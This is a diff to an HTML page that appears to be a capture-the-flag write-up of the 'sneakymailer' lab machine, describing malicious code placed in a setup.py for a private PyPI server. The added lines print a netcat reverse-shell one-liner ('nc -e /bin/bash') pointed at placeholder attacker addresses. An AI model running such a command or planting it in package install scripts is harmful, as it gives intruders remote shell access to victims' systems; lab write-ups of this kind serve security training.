@@ -144,8 +144,14 @@ body {
 				<img src="images/sneaky/pypi-setup1.PNG" alt="pypi docs" class="inline"/>							<br/><br/><br/>
 					
 				The basic idea is that we build these on our host kali system, and then transfer them over to sneakymailer. We then		<br/>
-				run the setup.py file which will contain our malicious code. I set these up on my system like so				<br/><br/>
+				run the setup.py file which will contain our malicious code. For our malicious code, we can just run a simple netcat		<br/>
+				one liner to send a reverse /bin/bash shell back to our machine. The command I will use is					<br/><br/><br/>
+				
+				<code>
+				nc -e /bin/bash (my-ip-goes-here) (my-port-goes-here)
+				</code>  <br/><br/><br/>
 					
+				I created setup.py and .pypirc on my kali system like so									<br/><br/>
 				<img src="images/sneaky/setup-py.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
 				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
 					
